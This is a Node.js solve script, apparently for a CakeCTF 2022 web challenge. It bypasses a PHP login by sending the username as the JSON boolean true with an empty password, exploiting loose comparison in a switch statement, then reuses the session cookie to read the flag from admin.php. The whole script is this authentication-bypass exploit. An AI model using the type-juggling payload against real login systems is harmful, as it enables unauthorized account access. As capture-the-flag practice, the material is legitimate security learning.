const axios = require('axios').default;


async function main() {
  const session_id = await axios.post(
    'http://web1.2022.cakectf.com:8005/',
    {
      username: true,
      password: '',
    }
  ).then((res) => {
    const re = /PHPSESSID=([0-9a-f]*)/;
    return re.exec(res.headers['set-cookie'])[1];
  });
  console.log(session_id);
  const flag = await axios.get(
    'http://web1.2022.cakectf.com:8005/admin.php',
    {
      headers: {
        Cookie: `PHPSESSID=${session_id};`,
      }
    }
  ).then((res) => {
    const re = /CakeCTF.*/;
    return re.exec(res.data)[0];
  });
  // CakeCTF{y0u_mu5t_c4st_2_STRING_b3f0r3_us1ng_sw1tch_1n_PHP}
  console.log(flag);
}


main().catch((e) => console.log(e));

